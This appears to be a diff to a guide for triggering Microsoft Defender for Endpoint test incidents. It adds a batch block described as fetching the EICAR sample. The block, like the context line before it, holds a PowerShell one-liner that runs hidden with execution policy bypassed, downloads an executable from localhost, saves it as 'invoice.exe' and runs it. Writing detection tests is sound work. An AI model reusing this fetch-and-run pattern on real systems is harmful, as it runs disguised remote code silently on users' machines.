@@ -102,6 +102,12 @@ Incidents <br>
 powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference = 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-MDATP-test\\invoice.exe');Start-Process 'C:\\test-MDATP-test\\invoice.exe'
 ```
 
+`Bat` file to download EICAR sample file <br>
+```bat
+powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference = 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\project\\invoice.exe');Start-Process 'C:\\project\invoice.exe'
+```
+
+
 ## 3. Suspicious powershell script
 ```powershell
 # Set the security protocol to TLS 1.2
